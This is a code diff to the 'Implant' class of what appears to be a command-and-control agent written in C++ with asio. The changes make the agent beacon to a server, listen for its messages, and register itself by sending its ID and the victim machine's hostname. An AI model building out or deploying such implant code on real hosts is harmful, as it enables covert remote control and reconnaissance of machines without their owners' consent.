@@ -25,10 +25,15 @@ void Implant::beacon() {
         asio::error_code ec;
         asio::ip::tcp::endpoint endpoint(asio::ip::make_address(host, ec), std::stoi(port));
         asio::ip::tcp::socket socket(context); 
+        asio::streambuf buf;
 
         socket.async_connect(endpoint, [&](const asio::error_code& error) {
             if (!error) {
                 std::cout << "Connected to the server!" << std::endl;
+                
+                // Listen for messages
+                msg::receiveResponse(socket, buf); 
+
                 // Send Register Info
                 registerAgent(socket);
             } else {
@@ -42,22 +47,35 @@ void Implant::beacon() {
         });
 
         context.run();
-        socket.close();
     }
+}
+
+void Implant::handleResponse(std::string& data) {
+    std::cout << "DATA: " << data << std::endl;
 }
 
 void Implant::registerAgent(asio::ip::tcp::socket& socket) {
     // check if registered, if not register
-    std::string message = "Agent registered"; 
+    std::string message = "Agent registered";
 
     // build request obj
     msg::MessageHeader header;
+    header.agent_id = id;
     header.size = message.size();
     header.type = msg::MessageType::RegisterAgent;
 
     msg::Request request;
     request.header = header;
-    request.body = std::vector<uint8_t>(message.begin(), message.end());
+    json body;
+    body["message"] = message;
+
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == -1) {
+        std::cerr << "Error getting the hostname" << std::endl;
+    }
+
+    body["hostname"] = hostname;
+    request.body = body;
 
     msg::sendRequest(socket, request);
 }
